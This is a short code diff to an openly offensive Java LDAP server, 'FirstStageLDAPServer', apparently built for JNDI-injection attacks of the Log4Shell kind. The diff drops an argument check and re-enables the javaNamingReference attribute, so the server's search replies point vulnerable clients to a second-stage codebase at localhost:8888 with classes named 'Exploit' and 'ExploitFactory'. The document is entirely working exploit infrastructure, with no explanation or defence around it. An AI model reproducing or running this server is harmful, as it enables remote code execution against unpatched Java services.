@@ -50,10 +50,6 @@ public class FirstStageLDAPServer {
 
     public static void main ( String[] args ) {
         int port = 1389;
-        if ( args.length < 1) {
-            System.err.println(FirstStageLDAPServer.class.getSimpleName() + "<second_stage_url>");
-            System.exit(-1);
-        }
         String hostName = "localhost";
         String secondStageServerURL = "http://localhost:8888";
 
@@ -105,7 +101,7 @@ public class FirstStageLDAPServer {
             String secondStageURL = prepareURL(base);
             e.addAttribute("javaClassName", "Exploit");
             e.addAttribute("javaCodeBase", secondStageURL);
-//            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
             e.addAttribute("javaFactory", "ExploitFactory");
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
